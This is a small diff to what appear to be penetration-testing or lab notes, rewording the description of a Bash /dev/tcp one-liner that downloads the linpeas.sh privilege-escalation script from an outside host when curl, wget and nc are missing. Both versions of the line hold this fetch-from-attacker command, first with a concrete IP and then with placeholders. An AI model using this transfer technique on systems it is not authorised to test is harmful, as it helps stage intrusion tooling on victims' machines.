@@ -31,9 +31,9 @@
 
 
 
-**Alternative (Bash /dev/tcp):** 
+Alternative method to fetch and run linpeas.sh when common tools (curl/wget/nc) are unavailable on the target — using Bash’s /dev/tcp:
 ```
 
-( exec 3<>/dev/tcp/10.10.16.22/5555; printf 'GET /test HTTP/1.1\r\nHost: 10.10.16.22:5555\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh
+( exec 3<>/dev/tcp/IP/PORT; printf 'GET /test HTTP/1.1\r\nHost: IP:PORT\r\nConnection: close\r\n\r\n' >&3; cat <&3; exec 3<&-; exec 3>&- ) > linpeas.sh
 
 ```
